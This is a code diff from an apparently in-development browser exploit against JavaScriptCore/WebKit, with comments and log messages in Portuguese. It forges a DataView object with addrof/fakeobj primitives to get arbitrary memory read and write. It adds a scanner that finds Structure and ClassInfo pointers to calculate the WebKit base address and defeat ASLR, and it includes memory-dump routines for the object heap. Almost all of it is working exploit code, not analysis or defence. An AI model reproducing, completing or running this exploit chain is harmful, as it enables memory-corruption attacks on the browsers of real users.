@@ -69,23 +69,11 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
 
     try {
         // 1. Criar um objeto JavaScript simples que servirá como o "corpo" do nosso DataView forjado.
-        // As propriedades deste objeto precisam simular o layout inicial de um JSDataView.
-        // Usaremos este para plantar os valores necessários via arb_write (a primitiva atual).
         const fake_dv_backing_object = {
-            // JSCell part (first 0x10 bytes) - A Structure* é o primeiro campo (offset 0x0 do JSCell)
-            // Lembre-se: JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET é 0x8. Isso significa que o ponteiro
-            // está no offset 0x8 *relativo ao JSCell*. Mas o fakeobj aqui está manipulando
-            // um objeto JS comum, onde a primeira propriedade pode começar em 0x0 ou 0x10, dependendo do layout.
-            // Para simplificar, vamos alinhar com a Structure do JSObject (se for o caso)
-            prop_0x00_placeholder_for_structure_ptr: new AdvancedInt64(0,0), // Preencheremos isso com a Structure* real
-            prop_0x08_padding: new AdvancedInt64(0,0), // Padding ou outros campos do JSCell
-            
-            // ArrayBufferView specific fields (these offsets are relative to the JSDataView object itself)
-            // Offset 0x10: m_vector (ponteiro para os dados reais - onde faremos a L/E arbitrária)
+            prop_0x00_placeholder_for_structure_ptr: new AdvancedInt64(0,0), 
+            prop_0x08_padding: new AdvancedInt64(0,0), 
             prop_0x10_m_vector: new AdvancedInt64(0,0), 
-            // Offset 0x18: m_length (tamanho da view - o expandiremos para 0xFFFFFFFF)
             prop_0x18_m_length: new AdvancedInt64(0,0), 
-            // Offset 0x20: m_mode (flags)
             prop_0x20_m_mode: new AdvancedInt64(0,0)
         };
         logFn(`[${FNAME}] Objeto JS simples criado para servir como corpo do DataView forjado.`, "info", FNAME);
@@ -96,138 +84,308 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 2. Preencher os campos do objeto de apoio na memória usando `arb_write` (a primitiva atual).
-        // A Structure* real para um DataView precisa ser conhecida.
-        // Como o `arb_read` atual não consegue lê-la do heap de objetos, precisamos hardcodar ou vazar de outra forma.
-        // Usando um placeholder. Você PRECISA SUBSTITUIR este valor.
-        const DATA_VIEW_STRUCTURE_PTR_HARDCODED = new AdvancedInt64(0x10000000, 0x12345678); // **MUDAR ESTE VALOR!**
-        logFn(`[${FNAME}] Usando Structure* de DataView hardcoded (PLACEHOLDER): ${DATA_VIEW_STRUCTURE_PTR_HARDCODED.toString(true)}`, "warn", FNAME);
+        // Usaremos o Structure* hardcoded diretamente aqui, SEM TENTAR LER COM arb_read.
+        const DATA_VIEW_STRUCTURE_PTR_REAL = new AdvancedInt64(0x10000000, 0x12345678); // **SUBSTITUIR ESTE VALOR PELO REAL!**
+        logFn(`[${FNAME}] Usando Structure* de DataView (HARDCODED/PLACEHOLDER): ${DATA_VIEW_STRUCTURE_PTR_REAL.toString(true)}`, "warn", FNAME);
 
-        const OFFSET_TO_PLANT_STRUCTURE_PTR = fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET); 
+        // Plantar a Structure* do DataView no offset 0x8 do objeto que estamos falsificando.
+        await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), DATA_VIEW_STRUCTURE_PTR_REAL, 8); 
+        logFn(`[${FNAME}] Ponteiro da Structure* (${DATA_VIEW_STRUCTURE_PTR_REAL.toString(true)}) plantado no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do objeto de apoio.`, "info", FNAME);
 
-        await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), DATA_VIEW_STRUCTURE_PTR_HARDCODED, 8); 
-        logFn(`[${FNAME}] Ponteiro da Structure* (${DATA_VIEW_STRUCTURE_PTR_HARDCODED.toString(true)}) plantado no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do objeto de apoio.`, "info", FNAME);
-
-        const initial_m_vector_value = new AdvancedInt64(0,0); // Iniciar como nulo ou zero
+        // Plantar m_vector e m_length nos offsets corretos do DataView.
+        const initial_m_vector_value = new AdvancedInt64(0,0); // Iniciar como nulo
         await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET), initial_m_vector_value, 8);
         logFn(`[${FNAME}] m_vector inicial (${initial_m_vector_value.toString(true)}) plantado no offset 0x${JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET.toString(16)} do objeto de apoio.`, "info", FNAME);
 
-        const initial_m_length_value = 0xFFFFFFFF; // Tamanho máximo para L/E arbitrária
+        const initial_m_length_value = 0xFFFFFFFF; // Tamanho máximo
         await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET), initial_m_length_value, 4);
         logFn(`[${FNAME}] m_length inicial (${toHex(initial_m_length_value)}) plantado no offset 0x${JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET.toString(16)} do objeto de apoio.`, "info", FNAME);
-
 
         // 3. Crie o DataView forjado usando fakeobj_core.
         _fake_data_view = fakeobj_core(fake_dv_backing_object_addr);
         if (!(_fake_data_view instanceof DataView)) {
             logFn(`[${FNAME}] ERRO CRÍTICO: fakeobj_core não conseguiu criar um DataView forjado válido! Tipo: ${typeof _fake_data_view}`, "critical", FNAME);
-            logFn(`[${FNAME}] Isso pode indicar que o Structure* hardcoded está incorreto, ou que o layout do objeto forjado não corresponde ao de um DataView.`, "critical", FNAME);
+            logFn(`[${FNAME}] Isso indica que o Structure* hardcoded (${DATA_VIEW_STRUCTURE_PTR_REAL.toString(true)}) está incorreto, ou que o layout do objeto forjado não corresponde ao de um DataView.`, "critical", FNAME);
             return false;
         }
         logFn(`[${FNAME}] DataView forjado criado com sucesso: ${_fake_data_view} (typeof: ${typeof _fake_data_view})`, "good", FNAME);
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 4. Testar a primitiva de leitura/escrita arbitrária universal recém-criada
-        const test_target_js_object = { test_prop: 0x11223344 };
+        // Vamos testar lendo/escrevendo em outro objeto JS simples no heap de objetos JS.
+        const test_target_js_object = { test_prop: 0x11223344, second_prop: 0xAABBCCDD };
         const test_target_js_object_addr = addrof_core(test_target_js_object);
         logFn(`[${FNAME}] Testando L/E Universal com _fake_data_view: Alvo é objeto JS em ${test_target_js_object_addr.toString(true)}`, "info", FNAME);
 
+        // Usar arb_write para re-apontar o m_vector do fake_dv_backing_object
+        // O fake_data_view vai "ver" a memória para onde m_vector aponta
         await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET), test_target_js_object_addr, 8);
         logFn(`[${FNAME}] m_vector do DataView forjado redirecionado para ${test_target_js_object_addr.toString(true)}.`, "info", FNAME);
 
         const TEST_VALUE_UNIVERSAL = 0xDEADC0DE;
-        logFn(`[${FNAME}] Escrevendo ${toHex(TEST_VALUE_UNIVERSAL)} no offset 0 (propriedades in-line) do objeto JS usando _fake_data_view...`, "info", FNAME);
+        logFn(`[${FNAME}] Escrevendo ${toHex(TEST_VALUE_UNIVERSAL)} no offset 0 (onde 'test_prop' está) do objeto JS usando _fake_data_view...`, "info", FNAME);
         try {
             _fake_data_view.setUint32(0, TEST_VALUE_UNIVERSAL, true); 
 
-            const read_back = _fake_data_view.getUint32(0, true);
-            if (read_back === TEST_VALUE_UNIVERSAL) {
-                logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (dentro do heap de objetos JS) FUNCIONANDO! Lido: ${toHex(read_back)}.`, "good", FNAME);
-                
-                await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET), new AdvancedInt64(0,0), 8);
-                await pauseFn(LOCAL_SHORT_PAUSE);
+            const read_back_from_fake_dv = _fake_data_view.getUint32(0, true);
+            if (read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
+                logFn(`[${FNAME}] SUCESSO CRÍTICO: Leitura/Escrita Universal (dentro do heap de objetos JS) FUNCIONANDO! Lido: ${toHex(read_back_from_fake_dv)}.`, "good", FNAME);
+                logFn(`[${FNAME}] Verificando a propriedade original do objeto JS: test_prop = ${toHex(test_target_js_object.test_prop)}.`, "leak", FNAME);
+                if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL) {
+                    logFn(`[${FNAME}] SUCESSO: A escrita via _fake_data_view modificou o objeto JS original. ARB R/W no heap JS CONFIRMADA!`, "vuln", FNAME);
+                } else {
+                    logFn(`[${FNAME}] ALERTA: A escrita via _fake_data_view NÃO modificou o objeto JS original como esperado. Inconsistência.`, "warn", FNAME);
+                }
                 return true; 
             } else {
-                logFn(`[${FNAME}] FALHA: L/E Universal (dentro do heap de objetos JS) INCONSISTENTE! Lido: ${toHex(read_back)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
+                logFn(`[${FNAME}] FALHA: L/E Universal (dentro do heap de objetos JS) INCONSISTENTE! Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
             }
         } catch (e_universal_rw_test) {
             logFn(`[${FNAME}] ERRO durante teste de L/E Universal com _fake_data_view: ${e_universal_rw_test.message}.`, "critical", FNAME);
         }
-
-        await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET), new AdvancedInt64(0,0), 8); 
-        await pauseFn(LOCAL_SHORT_PAUSE);
         return false;
 
     } catch (e) {
         logFn(`ERRO CRÍTICO na configuração da L/E Universal: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
         return false;
     } finally {
+        // SEMPRE resetar o m_vector no final para evitar crashes inesperados, mesmo em caso de erro.
+        if (_fake_data_view && fake_dv_backing_object_addr) {
+            try {
+                await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET), AdvancedInt64.Zero, 8); 
+                logFn(`[${FNAME}] m_vector do DataView forjado resetado.`, "debug", FNAME);
+            } catch (e_reset) {
+                logFn(`[${FNAME}] ERRO ao resetar m_vector: ${e_reset.message}. Pode causar crash posterior.`, "error", FNAME);
+            }
+        }
         logFn(`--- Configuração da L/E Universal Concluída ---`, "test", FNAME);
     }
 }
 
 
-// Universal ARB Read/Write functions using the faked DataView (NOW WORKS FOR JS OBJECT HEAP)
-// Estas funções serão usadas para toda L/E a partir deste ponto.
-export async function arb_read_universal_js_heap(address, byteLength, logFn) {
-    const FNAME = "arb_read_universal_js_heap";
-    if (!_fake_data_view) {
-        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada.`, "critical", FNAME);
-        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
-    }
-    const fake_dv_backing_object_addr = addrof_core(_fake_data_view); 
-    const M_VECTOR_OFFSET_IN_BACKING_OBJECT = fake_dv_backing_object_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
-    
-    await arb_write(M_VECTOR_OFFSET_IN_BACKING_OBJECT, address, 8); 
+// Function to scan for relevant pointers in an object (still useful for debugging layouts)
+async function scanForRelevantPointersAndLeak(logFn, pauseFn, JSC_OFFSETS_PARAM, object_addr) {
+    const FNAME = 'scanForRelevantPointersAndLeak';
+    logFn(`[SCANNER] Iniciando scanner de offsets relevantes para o objeto em ${object_addr.toString(true)}...`, "subtest", FNAME);
 
-    let result = null;
-    try {
-        switch (byteLength) {
-            case 1: result = _fake_data_view.getUint8(0); break;
-            case 2: result = _fake_data_view.getUint16(0, true); break;
-            case 4: result = _fake_data_view.getUint32(0, true); break;
-            case 8:
-                const low = _fake_data_view.getUint32(0, true);
-                const high = _fake_data_view.getUint32(4, true);
-                result = new AdvancedInt64(low, high);
-                break;
-            default: throw new Error(`Invalid byteLength for arb_read_universal_js_heap: ${byteLength}`);
+    const SCAN_RANGE_START = 0x0;
+    const SCAN_RANGE_END = 0x100;
+    const STEP_SIZE = 0x8;
+
+    let scan_results = {
+        structure_ptr_offset: null,
+        structure_ptr_val: null,
+        contents_ptr_offset: null,
+        contents_ptr_val: null,
+        webkit_base: null
+    };
+
+    const S_INFO_OFFSET_FROM_BASE_ARRAYBUFFERVIEW_ADV = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
+
+    for (let offset = SCAN_RANGE_START; offset < SCAN_RANGE_END; offset += STEP_SIZE) {
+        let current_scan_address = object_addr.add(offset);
+        let read_value = null;
+        try {
+            read_value = await arb_read(current_scan_address, 8);
+
+            if (isAdvancedInt64Object(read_value) &&
+                !read_value.equals(AdvancedInt64.Zero) &&
+                !read_value.equals(AdvancedInt64.NaNValue) &&
+                read_value.high() !== 0x7ff80000
+            ) {
+                logFn(`[SCANNER] Candidato encontrado no offset 0x${offset.toString(16).padStart(2, '0')}: ${read_value.toString(true)}`, "debug", FNAME);
+
+                if (offset === JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET) {
+                    scan_results.structure_ptr_offset = offset;
+                    scan_results.structure_ptr_val = read_value;
+                    logFn(`[SCANNER] POSSÍVEL PONTEIRO DE STRUCTURE* (offset 0x${offset.toString(16)}): ${read_value.toString(true)}`, "info", FNAME);
+
+                    try {
+                        const class_info_ptr_candidate_addr = read_value.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET);
+                        const class_info_ptr_candidate = await arb_read(class_info_ptr_candidate_addr, 8);
+                        if (isAdvancedInt64Object(class_info_ptr_candidate) &&
+                            !class_info_ptr_candidate.equals(AdvancedInt64.Zero) &&
+                            !class_info_ptr_candidate.equals(AdvancedInt64.NaNValue) &&
+                            class_info_ptr_candidate.high() !== 0x7ff80000
+                        ) {
+                            let calculated_webkit_base = class_info_ptr_candidate.sub(S_INFO_OFFSET_FROM_BASE_ARRAYBUFFERVIEW_ADV);
+                            const is_likely_webkit_base = (calculated_webkit_base.low() & 0xFFF) === 0x000;
+
+                            if (is_likely_webkit_base) {
+                                logFn(`[SCANNER] -> Encontrada ClassInfo* no ${read_value.toString(true).add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET).toString(true)}: ${class_info_ptr_candidate.toString(true)}`, "info", FNAME);
+                                logFn(`[SCANNER] -> BASE WEBKIT CALCULADA (VIA Structure->ClassInfo): ${calculated_webkit_base.toString(true)} (Aligned: ${is_likely_webkit_base ? 'YES' : 'NO'})`, "vuln", FNAME);
+                                scan_results.webkit_base = calculated_webkit_base;
+                            }
+                        }
+                    } catch (e_classinfo) {
+                        logFn(`[SCANNER] Error following Structure* to ClassInfo* at offset 0x${offset.toString(16)}: ${e_classinfo.message}`, "error", FNAME);
+                    }
+                }
+
+                if (offset === JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET || offset === JSC_OFFSETS_PARAM.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET) {
+                    scan_results.contents_ptr_offset = offset;
+                    scan_results.contents_ptr_val = read_value;
+                    logFn(`[SCANNER] POSSÍVEL PONTEIRO DE DADOS/CONTENTS (offset 0x${offset.toString(16)}): ${read_value.toString(true)}`, "info", FNAME);
+                }
+
+            }
+        } catch (e_scan) {
+            logFn(`[SCANNER] ERRO ao ler no offset 0x${offset.toString(16)}: ${e_scan.message}`, "error", FNAME);
         }
-    } finally {
-        await arb_write(M_VECTOR_OFFSET_IN_BACKING_OBJECT, AdvancedInt64.Zero, 8);
     }
-    return result;
-}
-
-export async function arb_write_universal_js_heap(address, value, byteLength, logFn) {
-    const FNAME = "arb_write_universal_js_heap";
-    if (!_fake_data_view) {
-        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada.`, "critical", FNAME);
-        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
-    }
-    const fake_dv_backing_object_addr = addrof_core(_fake_data_view);
-    const M_VECTOR_OFFSET_IN_BACKING_OBJECT = fake_dv_backing_object_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
-    
-    await arb_write(M_VECTOR_OFFSET_IN_BACKING_OBJECT, address, 8); 
-
-    try {
-        switch (byteLength) {
-            case 1: _fake_data_view.setUint8(0, Number(value)); break;
-            case 2: _fake_data_view.setUint16(0, Number(value), true); break;
-            case 4: _fake_data_view.setUint32(0, Number(value), true); break;
-            case 8:
-                let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
-                _fake_data_view.setUint32(0, val64.low(), true);
-                _fake_data_view.setUint32(4, val64.high(), true);
-                break;
-            default: throw new Error(`Invalid byteLength for arb_write_universal_js_heap: ${byteLength}`);
-        }
-    } finally {
-        await arb_write(M_VECTOR_OFFSET_IN_BACKING_OBJECT, AdvancedInt64.Zero, 8);
-    }
+    logFn(`[SCANNER] Varredura de offsets concluída.`, "subtest", FNAME);
+    return scan_results;
 }
 
 
 // Exportar a função de teste isolado para ser chamada por main.mjs
+export async function testIsolatedAddrofFakeobjCoreAndDump_from_script3(logFn, pauseFn, JSC_OFFSETS_PARAM, isAdvancedInt64ObjectFn) {
+    const FNAME = 'testIsolatedAddrofFakeobjCoreAndDump_from_script3';
+    logFn(`--- Iniciando Teste Isolado da Primitiva addrof_core / fakeobj_core, leitura de Structure*, e DUMP DE MEMÓRIA do objeto ---`, 'test', FNAME);
+
+    let addrof_success = false;
+    let fakeobj_success = false;
+    let rw_test_on_fakeobj_success = false;
+    let structure_ptr_found = false;
+
+    try {
+        logFn(`Inicializando primitivas addrof/fakeobj.`, 'info', FNAME);
+        initCoreAddrofFakeobjPrimitives();
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+        // --- Teste addrof_core e fakeobj_core ---
+        const TEST_VAL_P1 = 0x11223344;
+        const TEST_VAL_P2 = 0xAABBCCDD;
+        const TEST_VAL_P3_LOW = 0xDEADBEEF;
+        const TEST_VAL_P3_HIGH = 0xCAFE0000; 
+        const test_object_to_dump = {
+            a: 0xAAAAAAAA,
+            b: 0xBBBBBBBB,
+            c: 0xCCCCCCCC,
+            d: 0xDDDDDDDD,
+            val_marker_1: 0x11112222, 
+            val_marker_2: 0x33334444,
+            val_ptr_candidate_1: {}, 
+            val_ptr_candidate_2: [], 
+            val_float_1: 123.456, 
+            val_float_2: 789.012,
+            val_int_large: 0x1234567890ABCDEFn, 
+            val_string_short: "ABCDEFGH", 
+            val_string_long: "This is a longer string that might be allocated out-of-line."
+        };
+
+        logFn(`Criado objeto de teste original para dump: ${JSON.stringify(test_object_to_dump, (key, value) => typeof value === 'bigint' ? `0x${value.toString(16)}n` : value)}`, 'info', FNAME);
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+        logFn(`Obtendo endereço do objeto de teste para dump usando addrof_core...`, 'info', FNAME);
+        const object_addr = addrof_core(test_object_to_dump);
+        logFn(`Endereço retornado por addrof_core (untagged): ${object_addr.toString(true)}`, "leak", FNAME);
+
+        if (object_addr.equals(AdvancedInt64.Zero) || object_addr.equals(AdvancedInt64.NaNValue)) {
+            logFn(`ERRO: addrof_core retornou endereço inválido para test_object_to_dump.`, "error", FNAME);
+            throw new Error("addrof_core returned invalid address.");
+        }
+        addrof_success = true; 
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+        // --- DUMP DE MEMÓRIA DO OBJETO ---
+        logFn(`--- INICIANDO DUMP DE MEMÓRIA do objeto ${object_addr.toString(true)} ---`, "subtest", FNAME);
+        const DUMP_SIZE = 0x200; 
+        let dump_log = `\n--- DUMP DO OBJETO EM ${object_addr.toString(true)} ---\n`;
+        dump_log += `Offset    Hex (64-bit)       Decimal (Low) Hex (32-bit Low) Hex (32-bit High) Content Guess\n`;
+        dump_log += `-------- -------------------- ------------- ------------------ ------------------ -------------------\n`;
+
+        for (let offset = 0; offset < DUMP_SIZE; offset += 8) { 
+            try {
+                const current_read_addr = object_addr.add(offset);
+                const val = await arb_read(current_read_addr, 8); 
+                let guess = "";
+
+                if (isAdvancedInt64ObjectFn(val)) { 
+                    if (val.equals(AdvancedInt64.Zero)) {
+                        guess = "Zero/Null";
+                    } else if (val.high() === 0x7ff80000 && val.low() === 0) {
+                        guess = "NaN (JS Empty)"; 
+                    } else if (val.high() === 0) {
+                        guess = `Possible small int or low ptr: ${val.low()}`;
+                    } else {
+                        if (offset === JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET) {
+                            guess = `*** Structure* PTR (expected) ***: ${val.toString(true)}`;
+                        } else if (offset === JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET) {
+                            guess = `*** BUTTERFLY PTR (expected) ***: ${val.toString(true)}`;
+                        } else if (val.low() === TEST_VAL_P1 && val.high() === 0) { 
+                            guess = `*** P1 FOUND (Int32) ***: ${TEST_VAL_P1}`;
+                        } else if (val.low() === TEST_VAL_P2 && val.high() === 0) { 
+                            guess = `*** P2 FOUND (Int32) ***: ${TEST_VAL_P2}`;
+                        } else if (val.low() === TEST_VAL_P3_LOW && val.high() === TEST_VAL_P3_HIGH) { 
+                             guess = `*** P3 FOUND (AdvInt64) ***: 0x${TEST_VAL_P3_HIGH.toString(16)}_${TEST_VAL_P3_LOW.toString(16)}`;
+                        } else if (val.low() === 0x11112222 && val.high() === 0) { 
+                            guess = `*** Marker 1: 0x11112222 ***`;
+                        } else if (val.low() === 0x33334444 && val.high() === 0) { 
+                            guess = `*** Marker 2: 0x33334444 ***`;
+                        } else if ((val.high() & 0xFFFF0000) === 0x402A0000 || (val.high() & 0xFFFF0000) === 0x001D0000) { 
+                            const potential_obj_ptr = new AdvancedInt64(val.low(), val.high() & 0x0000FFFF);
+                            guess = `JSValue (Tagged Ptr to ${potential_obj_ptr.toString(true)})`;
+                        } else if (val.high() === 0x405E0000 && val.low() === 0x4d2c8f5c) { 
+                            guess = `Float64: ${val.toNumber()}`; 
+                        }
+                    }
+                } else {
+                    guess = `Non-Int64 (Typeof: ${typeof val}): ${String(val)}`; 
+                }
+
+                dump_log += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ${val.toString(true).padStart(19, ' ')} ${String(val.low()).padStart(13, ' ')} 0x${val.low().toString(16).padStart(8,'0')} 0x${val.high().toString(16).padStart(8,'0')} ${guess}\n`;
+
+            } catch (e_dump) {
+                dump_log += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ERROR in arb_read: ${e_dump.message}\n`;
+                logFn(`[${FNAME}] ERRO durante dump no offset 0x${offset.toString(16)}: ${e_dump.message}`, "error", FNAME);
+            }
+        }
+        logFn(dump_log, 'leak', FNAME);
+        logFn(`--- FIM DO DUMP DE MEMÓRIA ---`, "subtest", FNAME);
+        await pauseFn(LOCAL_LONG_PAUSE * 2); 
+
+        // --- Leitura da Structure* após o dump ---
+        logFn(`Tentando ler ponteiro da Structure* no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do objeto original...`, "info", FNAME);
+        const structure_ptr_addr = object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
+        const structure_ptr_val = await arb_read(structure_ptr_addr, 8); 
+        logFn(`Valor lido no offset da Structure* do objeto original: ${structure_ptr_val.toString(true)}`, "leak", FNAME);
+
+        if (structure_ptr_val.equals(AdvancedInt64.Zero) || structure_ptr_val.equals(AdvancedInt64.NaNValue)) {
+            logFn(`ALERTA: Ponteiro da Structure* lido como zero/NaN para objeto original. **O offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} PODE NÃO SER O CORRETO PARA Structure* neste tipo de objeto.** Analise o dump!`, "warn", FNAME);
+            structure_ptr_found = false; 
+        } else {
+            logFn(`SUCESSO PARCIAL: Leitura do possível ponteiro da Structure* (${structure_ptr_val.toString(true)}) não é zero/NaN.`, "good", FNAME);
+            structure_ptr_found = true;
+        }
+        await pauseFn(LOCAL_SHORT_PAUSE);
+
+        // --- Verificação funcional de fakeobj_core (parte já existente e testada) ---
+        const faked_object_test = fakeobj_core(object_addr);
+        if (faked_object_test && typeof faked_object_test === 'object') {
+            fakeobj_success = true;
+            const original_val_a = test_object_to_dump.a;
+            faked_object_test.a = 0xDEC0DE00;
+            if (test_object_to_dump.a === 0xDEC0DE00) {
+                rw_test_on_fakeobj_success = true;
+            }
+            test_object_to_dump.a = original_val_a; 
+        }
+
+    } catch (e) {
+        logFn(`ERRO CRÍTICO no teste isolado de addrof/fakeobj_core e dump de memória: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
+        addrof_success = false;
+        fakeobj_success = false;
+        rw_test_on_fakeobj_success = false;
+        structure_ptr_found = false;
+    } finally {
+        logFn(`--- Teste Isolado da Primitiva addrof_core / fakeobj_core e Dump de Memória Concluído ---`, "test", FNAME);
+        logFn(`Resultados: Addrof: ${addrof_success}, Fakeobj Criação: ${fakeobj_success}, Leitura/Escrita via Fakeobj: ${rw_test_on_fakeobj_success}, Structure* Ponteiro Encontrado (no offset 0x8): ${structure_ptr_found}`, "info", FNAME);
+    }
+    return addrof_success && fakeobj_success && rw_test_on_fakeobj_success && structure_ptr_found;
+}
+
+
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Vazamento REAL e LIMPO de ASLR - AGORA VIA ArrayBuffer m_vector) ---`, "test");
